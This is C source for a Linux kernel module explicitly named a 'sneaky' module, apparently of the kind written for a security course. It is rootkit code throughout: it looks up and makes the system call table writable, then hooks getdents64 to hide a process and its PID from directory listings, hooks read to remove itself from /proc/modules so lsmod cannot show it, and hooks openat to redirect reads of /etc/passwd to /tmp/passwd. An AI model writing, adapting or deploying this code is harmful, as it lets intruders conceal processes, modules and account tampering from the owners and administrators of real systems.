#include <linux/module.h>      // Core module functionality
#include <linux/kernel.h>      // Kernel types and macros
#include <linux/init.h>        // Initialization macros
#include <linux/syscalls.h>    // System call definitions
#include <linux/kallsyms.h>    // kallsyms_lookup_name
#include <linux/dirent.h>      // Linux directory entries
#include <linux/version.h>     // LINUX_VERSION_CODE
#include <linux/proc_fs.h>     // Proc file system
#include <linux/fs.h>          // File operations
#include <linux/uaccess.h>     // copy_to_user, copy_from_user
#include <linux/slab.h>        // kmalloc
#include <asm/unistd.h>        // __NR_* system call numbers

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Sneaky kernel module");

static char* sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");

// Function pointer types for the system calls we'll intercept
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_read_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_openat_t)(const struct pt_regs *);

// Original system call function pointers
static orig_getdents64_t orig_getdents64;
static orig_read_t orig_read;
static orig_openat_t orig_openat;

// System call table pointer
static unsigned long* sys_call_table;

// Function to enable writing to read-only memory pages
static inline void enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    if (pte->pte & _PAGE_RW) return;
    pte->pte |= _PAGE_RW;
}

// Function to restore memory pages to read-only
static inline void disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    pte->pte &= ~_PAGE_RW;
}

// Our custom getdents64 to hide files and directories
asmlinkage long sneaky_getdents64(const struct pt_regs *regs) {
    // Call the original getdents64
    long ret = orig_getdents64(regs);
    
    // Get parameters from regs
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long size = ret;
    
    // Variables for iterating through results
    long position = 0;
    struct linux_dirent64 *current_dir, *dirent_kern = NULL;
    
    // If original call returned nothing, nothing to do
    if (ret <= 0) {
        return ret;
    }
    
    // Allocate memory for kernel buffer
    dirent_kern = kvzalloc(size, GFP_KERNEL);
    if (dirent_kern == NULL) {
        return ret;
    }
    
    // Copy user space data to kernel
    if (copy_from_user(dirent_kern, dirent, size)) {
        kvfree(dirent_kern);
        return ret;
    }
    
    // Iterate through all entries
    while (position < size) {
        current_dir = (struct linux_dirent64 *)((char*)dirent_kern + position);
        
        // Check if this is "sneaky_process" or our PID
        if (strcmp(current_dir->d_name, "sneaky_process") == 0 || 
            strcmp(current_dir->d_name, sneaky_pid) == 0) {
            
            // Calculate the size of the current entry
            long reclen = current_dir->d_reclen;
            
            // Check if it's the last entry
            if (position + reclen >= size) {
                // If last entry, just decrease size to remove it
                size -= reclen;
            } else {
                // Move all remaining entries up
                memmove(current_dir, (char*)current_dir + reclen, size - position - reclen);
                // Decrease size to account for removed entry
                size -= reclen;
                continue; // Don't increase position as the current position now has a new entry
            }
        }
        
        // Move to next entry
        position += current_dir->d_reclen;
    }
    
    // Copy modified data back to user space
    if (copy_to_user(dirent, dirent_kern, size)) {
        kvfree(dirent_kern);
        return ret;
    }
    
    // Free kernel buffer
    kvfree(dirent_kern);
    
    // Return modified size
    return size;
}

// Our custom read to hide the module from lsmod
asmlinkage long sneaky_read(const struct pt_regs *regs) {
    // Call the original read
    long ret = orig_read(regs);
    
    // If read was successful
    if (ret > 0) {
        // Get parameters from regs
        char __user *buf = (char *)regs->si;
        size_t count = ret;
        
        // Allocate kernel buffer
        char *kernel_buf = kvzalloc(count, GFP_KERNEL);
        if (!kernel_buf)
            return ret;
        
        // Copy from user space
        if (copy_from_user(kernel_buf, buf, count)) {
            kvfree(kernel_buf);
            return ret;
        }
        
        // Check if this is /proc/modules content
        if (strstr(kernel_buf, "sneaky_mod ") != NULL) {
            char *module_str = strstr(kernel_buf, "sneaky_mod ");
            char *end_of_line = strstr(module_str, "\n");
            
            if (module_str && end_of_line) {
                // Remove the line about sneaky_mod
                int line_len = end_of_line - module_str + 1; // +1 for the newline
                memmove(module_str, end_of_line + 1, kernel_buf + count - (end_of_line + 1));
                ret -= line_len;
            }
        }
        
        // Copy modified data back to user space
        if (copy_to_user(buf, kernel_buf, ret)) {
            kvfree(kernel_buf);
            return orig_read(regs); // If we fail, just return original
        }
        
        // Free kernel buffer
        kvfree(kernel_buf);
    }
    
    return ret;
}

// Our custom openat to hide modifications to /etc/passwd
asmlinkage long sneaky_openat(const struct pt_regs *regs) {
    // Get parameters from regs
    const char __user *filename = (const char *)regs->si;
    char *kernel_filename = NULL;
    long error = 0;
    
    // Allocate kernel buffer for filename
    kernel_filename = kvzalloc(256, GFP_KERNEL);
    if (!kernel_filename) {
        return orig_openat(regs);
    }
    
    // Copy filename to kernel space
    error = strncpy_from_user(kernel_filename, filename, 255);
    if (error < 0) {
        kvfree(kernel_filename);
        return orig_openat(regs);
    }
    kernel_filename[255] = '\0';
    
    // Check if this is /etc/passwd
    if (strcmp(kernel_filename, "/etc/passwd") == 0) {
        // Copy /tmp/passwd path to user space
        char new_name[] = "/tmp/passwd";
        if (copy_to_user((void*)filename, new_name, strlen(new_name) + 1)) {
            kvfree(kernel_filename);
            return orig_openat(regs);
        }
    }
    
    // Free kernel buffer
    kvfree(kernel_filename);
    
    // Call original openat with possibly modified path
    return orig_openat(regs);
}

// Initialize the module
static int __init sneaky_module_init(void) {
    printk(KERN_INFO "Sneaky module loaded\n");
    
    // Get system call table address
    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    
    // Enable writing to read-only memory
    enable_page_rw(sys_call_table);
    
    // Save the original system calls
    orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
    orig_read = (orig_read_t)sys_call_table[__NR_read];
    orig_openat = (orig_openat_t)sys_call_table[__NR_openat];
    
    // Replace with our sneaky versions
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
    sys_call_table[__NR_read] = (unsigned long)sneaky_read;
    sys_call_table[__NR_openat] = (unsigned long)sneaky_openat;
    
    // Restore memory protection
    disable_page_rw(sys_call_table);
    
    return 0;
}

// Exit function
static void __exit sneaky_module_exit(void) {
    printk(KERN_INFO "Sneaky module unloaded\n");
    
    // Enable writing to read-only memory
    enable_page_rw(sys_call_table);
    
    // Restore original system calls
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_read] = (unsigned long)orig_read;
    sys_call_table[__NR_openat] = (unsigned long)orig_openat;
    
    // Restore memory protection
    disable_page_rw(sys_call_table);
}

module_init(sneaky_module_init);
module_exit(sneaky_module_exit);